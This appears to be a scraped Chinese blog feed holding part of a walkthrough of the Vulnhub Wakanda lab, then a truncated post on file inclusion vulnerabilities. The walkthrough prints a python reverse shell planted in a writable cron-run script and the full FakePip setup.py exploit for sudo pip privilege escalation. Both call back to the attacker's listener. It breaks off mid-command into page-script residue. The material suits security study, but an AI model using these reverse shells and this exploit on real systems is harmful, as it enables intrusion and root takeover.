0x04 切换Bashssh连过去之后是一个python的shell，不是太方便操作。先用python切换到/bin/bash，切换之后是mamadou的用户。 123>>> import pty>>> pty.spawn(\"/bin/bash\")mamadou@Wakanda1:~$ 先直接使用find命令全局搜索一下flag哈哈哈，注意这里如果我们直接搜索的话会出现一大堆没有权限的返回结果，可以使用2>/dev/null来丢弃掉所有的错误输出。/dev/null是Linux一个特殊的设备文件，这个文件接收到的任何数据都会被丢弃，通常也被成为位桶(bit bucket)。 123456789mamadou@Wakanda1:~$ find / -name \"flag*\" 2>/dev/null/sys/devices/pci0000:00/0000:00:03.0/net/eth0/flags/sys/devices/virtual/net/lo/flags/sys/devices/platform/serial8250/tty/ttyS0/flags/sys/devices/platform/serial8250/tty/ttyS1/flags/sys/devices/platform/serial8250/tty/ttyS2/flags/sys/devices/platform/serial8250/tty/ttyS3/flags/home/devops/flag2.txt/home/mamadou/flag1.txt 发现了mamadou和devops两个目录下的flag文件，mamadou目录下的flag1.txt可以直接访问，devops则没有权限访问。现在我们拿到第一个flag了~ 1234mamadou@Wakanda1:~$ cat /home/mamadou/flag1.txt Flag : d86b9ad71ca887f4dd1dac86ba1c4dfcmamadou@Wakanda1:~$ cat /home/devops/flag2.txt cat: /home/devops/flag2.txt: Permission denied mamadou用户不出意外看起来没办法直接sudo，只能找找有没有什么其他曲线救国的方法。 0x05 利用Devops用户权限&&反向连接先使用cat /etc/passwd查看下靶机上的用户及权限： 123456789101112131415161718192021222324252627282930mamadou@Wakanda1:/var/mail$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/falseDebian-exim:x:104:109::/var/spool/exim4:/bin/falsemessagebus:x:105:110::/var/run/dbus:/bin/falsestatd:x:106:65534::/var/lib/nfs:/bin/falseavahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/falsesshd:x:108:65534::/var/run/sshd:/usr/sbin/nologinmamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/pythondevops:x:1001:1002:,,,:/home/devops:/bin/bash 发现之前发现的devops是有/bin/bash权限的，可以查看下用户为devops的文件，看是否能提权到devops用户权限，有以下一些可能存在利用点的文件。 12345678mamadou@Wakanda1:/var/mail$ find / -user devops 2>/dev/null/srv/.antivirus.py/tmp/test/home/devops/home/devops/.bashrc/home/devops/.profile/home/devops/.bash_logout/home/devops/flag2.txt 挨个查看下文件权限。 123456789101112131415mamadou@Wakanda1:/home/devops$ ls -latotal 24drwxr-xr-x 2 devops developer 4096 Aug 5 2018 .drwxr-xr-x 4 root root 4096 Aug 1 2018 ..lrwxrwxrwx 1 root root 9 Aug 5 2018 .bash_history -> /dev/null-rw-r--r-- 1 devops developer 220 Aug 1 2018 .bash_logout-rw-r--r-- 1 devops developer 3515 Aug 1 2018 .bashrc-rw-r----- 1 devops developer 42 Aug 1 2018 flag2.txt-rw-r--r-- 1 devops developer 675 Aug 1 2018 .profilemamadou@Wakanda1:/home/devops$ cd /srv/mamadou@Wakanda1:/srv$ ls -latotal 12drwxr-xr-x 2 root root 4096 Aug 1 2018 .drwxr-xr-x 22 root root 4096 Aug 1 2018 ..-rw-r--rw- 1 devops developer 256 Feb 29 12:06 .antivirus.py 发现/srv/.antivirus.py的隐藏文件权限为646，任何用户都可以对其进行修改，文件中python源码如下。 1open('/tmp/test','w').write('test') 并且系统后台一直有进程在重复运行/srv/.antivirus.py 1devops 1366 1 0 12:09 ? 00:00:00 python /srv/.antivirus.py /srv/.antivirus.py用户权限是devops，如果我们修改/srv/.antiviru.py文件中的内容为python的反向连接脚本，那后台的进程在执行/srv/.antivirus.py脚本时就会运行我们的反向连接脚本，从而我们可以获得到devops的反向shell。 12345678910mamadou@Wakanda1:/srv$ cat ./.antivirus.py open('/tmp/test','w').write('test')import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"192.168.199.211\",1238))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/bash\",\"-i\"]) 因为之前暂停过虚拟机，后台python进程已经很久没有运行过了，于是我们先监听端口然后重启下靶机，然后我们监听端口的bash就成功获得了shell连接。 12345678root@kali:~# nc -lvp 1235listening on [any] 1235 ...connect to [192.168.199.211] from Wakanda1.lan [192.168.199.105] 37062bash: cannot set terminal process group (479): Inappropriate ioctl for devicebash: no job control in this shelldevops@Wakanda1:/$ idid uid=1001(devops) gid=1002(developer) groups=1002(developer) 得到了第二个flag~ 12345678devops@Wakanda1:/$ cd /home/devopscd /home/devopsdevops@Wakanda1:~$ lslsflag2.txtdevops@Wakanda1:~$ cat flag2.txtcat flag2.txtFlag 2 : d8ce56398c88e1b4d9e5f83e64c79098 0x06 获取root权限当前是在devops权限下，先使用sudo -l查看下devops用户有哪些权限： 12345678devops@Wakanda1:~$ sudo -lsudo -lMatching Defaults entries for devops on Wakanda1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser devops may run the following commands on Wakanda1: (ALL) NOPASSWD: /usr/bin/pip 最后一行提示可以不用输入密码执行的命令是/usr/bin/pip。github上有相关的利用 进行提权的脚本，先将利用脚本下载到本地，然后修改localhost为本地kali ip192.168.199.211： 1234567891011121314151617181920212223242526from setuptools import setupfrom setuptools.command.install import installimport base64import osclass CustomInstall(install): def run(self): install.run(self) LHOST = 'localhost' # 修改为本地kali地址 LPORT = 13372 reverse_shell = 'python -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT) encoded = base64.b64encode(reverse_shell) os.system('echo %s|base64 -d|bash' % encoded)setup(name='FakePip', version='0.0.1', description='This will exploit a sudoer able to /usr/bin/pip install *', url='https://github.com/0x00-0x00/fakepip', author='zc00l', author_email='andre.marques@esecurity.com.br', license='MIT', zip_safe=False, cmdclass={'install': CustomInstall}) 在本地开启http服务，这样就可以在靶机侧下载exp： 12root@kali:/mnt/zxf/fakepip# python -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 ... 1234567891011121314devops@Wakanda1:~/fakepip$ pwdpwd/home/devops/fakepipdevops@Wakanda1:~/fakepip$ wget http://192.168.199.211:8000/setup.pywget http://192.168.199.211:8000/setup.py--2020-02-29 18:54:52-- http://192.168.199.211:8000/setup.pyConnecting to 192.168.199.211:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 1015 [text/plain]Saving to: ‘setup.py’ 0K 100% 66.7M=0s2020-02-29 18:54:52 (66.7 MB/s) - ‘setup.py’ saved [1015/1015] 之后现在本地kali监听脚本中指定的端口13372： 12root@kali:/mnt/zxf/fakepip# nc -lvvp 13372listening on [any] 13372 ... 在靶机侧用devops用户执行以下命令，来获取反向shell: 1sudo /usr/bin/pip install . --upgrade --force-reinstall 12345678910devops@Wakanda1:~/fakepip$ lslssetup.pydevops@Wakanda1:~/fakepip$ sudo /usr/bin/pip install . --upgrade --force-reinstall { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/categories/Web/"}],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://yoursite.com/tags/Vulnhub/"}]},{"title":"文件包含漏洞分析","slug":"LFI","date":"2019-07-17T12:36:57.641Z","updated":"2020-06-16T17:01:27.138Z","comments":true,"path":"2019/07/17/LFI/","link":"","permalink":"http://yoursite.com/2019/07/17/LFI/","excerpt":"0x00 漏洞简介如果允许客户端输入控制动态包含在服务器端的文件，会导致恶意代码的执行与敏感信息的泄露。文件包含通常分为本地文件包含（Local File Inclusion）和远程文件包含(Remote File Inclusion)。allow_url_fopen和allow_url_include为on的情况认为是远程文件包含漏洞，allow_url_fopen为off和allow_url_include为on为本地文件包含漏洞。","text":"0x00 漏洞简介如果允许客户端输入控制动态包含在服务器端的文件，会导致恶意代码的执行与敏感信息的泄露。文件包含通常分为本地文件包含（Local File Inclusion）和远程文件包含(Remote File Inclusion)。allow_url_fopen和allow_url_include为on的情况认为是远程文件包含漏洞，allow_url_fopen为off和allow_url_include为on为本地文件包含漏洞。 0x01 漏洞成因文件包含漏洞的产生原因是通过引入文件时，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意代码注入。当被包含的文件在服务器本地时，就形成本地文件包含漏洞。 0x02 实例分析12345if ($_GET['func']) { include $_GET['func'];} else { include 'default.php';} 程序的本意可能是当提交url为http://example.com/index.php?func=add.php时，调用add.php里面的样式内容和功能。直接访问http://example.com/index.php则会包含默认的default.php。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/categories/Web/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"http://yoursite.com/tags/文件包含/"}]}]}